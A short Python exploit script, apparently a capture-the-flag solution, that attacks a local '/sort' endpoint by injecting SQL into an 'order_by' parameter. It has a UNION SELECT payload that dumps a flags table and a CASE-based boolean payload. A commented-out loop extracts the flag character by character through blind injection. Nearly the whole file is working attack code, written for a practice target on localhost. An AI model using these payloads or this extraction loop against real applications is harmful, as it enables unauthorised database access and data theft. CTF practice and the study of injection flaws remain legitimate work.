import requests
url = 'http://localhost:1337/sort'




payload = """
CASE
WHEN (SELECT SUBSTR(flag,2,1) FROM flags_table)='l'
  THEN UCL_WON 
ELSE 
  ID 
END
"""

payload = """
    1 UNION SELECT flag FROM flags--
"""

data = {
    'order_by': payload
}

r = requests.post(url, data=data)
print(r.text)



# import requests
# import string
# import json

# url = 'http://localhost:1337/sort'


# flag = ''

# found = True
# while found:
#     found = False
#     for c in string.printable:
#         payload = f"""
#         CASE
#         WHEN (SELECT SUBSTR(flag,{len(flag)+1},1) FROM flags_table)='{c}'
#         THEN UCL_WON 
#         ELSE 
#         ID 
#         END
#         """
#         data = {
#             'order_by': payload
#         }
#         try:
#             r = json.loads(requests.post(url, data=data).text)
#             # print(f'{c} == {r[0][1]}')
#             if r[0][1] == 'REAL MADRID':
#                 flag += c
#                 print(flag)
#                 found = True
#                 break
#         except:
#             pass